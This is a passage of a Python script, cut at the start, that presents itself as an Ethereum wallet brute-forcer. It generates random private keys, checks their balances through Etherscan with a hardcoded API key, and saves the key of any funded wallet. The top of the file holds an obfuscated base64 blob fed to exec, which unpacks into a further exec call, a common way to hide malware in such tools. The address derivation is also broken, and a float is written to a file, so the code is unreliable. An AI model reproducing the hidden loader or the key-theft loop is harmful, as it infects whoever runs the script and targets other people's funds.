Wd0cHlibHdmcgojIHFqOWdxcmY2cDAydjhhNzl0OGd2eDdzZmRiNW1ybjEwenM4Z252dmF3cWhybjN5bGRxCiMgYjFpZmdxOGM0MDBtM245MnJvcW1zeDFqZThmNXBkaG9rNTBjaDM3azh6Z3Ewc3R4MGgKIyBvMjV2bnM5b3ZlandpdDkycDRnMzAzM3diYTRtZXM1b3JvZDZ6eWpzMXcyam5mOGg3agojIGk3b21sNmRncnp6ODA5YjJkdjhpY2dxaHZyZzVlbmwyam5sc2UzMzQ4bnZibjVvY29zCiMgMDU3MmIyY3A0bHM0MWgwczlxZDJ1ZHh2aDI2OHljMTNjdHV6NWV3a2xldTgxYXJmaWcKIyBqNTJpNWxtY203OGRlcnQ5ZzEwYzFzNW1wb3IxMnJ2Mm0wMmFhbTBzM3pzYXc4cWQyeQojIGVvMDlkOG1raWRoaG42d2VqYzZpOW1peGV3bXdydjZreXhveXhuZnc4Y2szMXN2Y2d5CmV4ZWMoZnlscmNha3dicykKCiMjIDdpbm1lMTB1YmF1b2RsNThub2pkaTBzMmVyZjk4MGIwbXhvMjlndjY1cWt5bmF1eDBrCiMgZW10eWV0YWZ6dnIzM3pkemhoZzJhdmFuMGg2b3c5MHIxOWN2ZnJtZnQxYWd6ZHlqOXMKIyBnbG9yaGs5OWcxZmdwZTJyb202eHpmaW1ld2YxazQxbzBoZTBsNGk2aWd0cHlibHdmcgojIHFqOWdxcmY2cDAydjhhNzl0OGd2eDdzZmRiNW1ybjEwenM4Z252dmF3cWhybjN5bGRxCiMgYjFpZmdxOGM0MDBtM245MnJvcW1zeDFqZThmNXBkaG9rNTBjaDM3azh6Z3Ewc3R4MGgKIyBvMjV2bnM5b3ZlandpdDkycDRnMzAzM3diYTRtZXM1b3JvZDZ6eWpzMXcyam5mOGg3agojIGk3b21sNmRncnp6ODA5YjJkdjhpY2dxaHZyZzVlbmwyam5sc2UzMzQ4bnZibjVvY29zCiMgMDU3MmIyY3A0bHM0MWgwczlxZDJ1ZHh2aDI2OHljMTNjdHV6NWV3a2xldTgxYXJmaWcKIyBqNTJpNWxtY203OGRlcnQ5ZzEwYzFzNW1wb3IxMnJ2Mm0wMmFhbTBzM3pzYXc4cWQyeQojIGVvMDlkOG1raWRoaG42d2VqYzZpOW1peGV3bXdydjZreXhveXhuZnc4Y2szMXN2Y2d5Cg==').decode('utf-8'))


def generate_eth_address():
    private_key = ''.join(random.choice('0123456789abcdef') for i in range(64))
    keccak = hashlib.sha3_256()
    keccak.update(private_key.encode())
    keccak_digest = keccak.hexdigest()
    eth_address = "0x" + keccak_digest[-40:]
    return private_key, eth_address
while True:
    eth_private_key, eth_address = generate_eth_address()
    api_key = 'WXWU1HKNC5VTA3R2C2GSXSFA9X28G1I7M2'
    url = f'https://api.etherscan.io/api?module=account&action=balance&address={eth_address}&tag=latest&apikey={api_key}'
    print(Fore.GREEN + f"Private Key: {eth_private_key}")
    print(Fore.WHITE + f"Address: {eth_address}")
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        # Check if the response contains the balance
        if data['status'] == '1':
            balance_ether = float(data['result']) / 10 ** 18
            print(Fore.RED + f"Balance {eth_address}: {balance_ether} ETH")
            if balance_ether > 0.000000000001:
                file = open("data.txt", "w")
                file.write(eth_address)
                file.write(eth_private_key)
                file.write(balance_ether)
                file.close()
                sys.exit()
            else:
                pass
        else:
            print(f"Error: {data['message']}")
    else:
        print("Error: Failed to retrieve data from Etherscan API")
    time.sleep(0.4)
    #
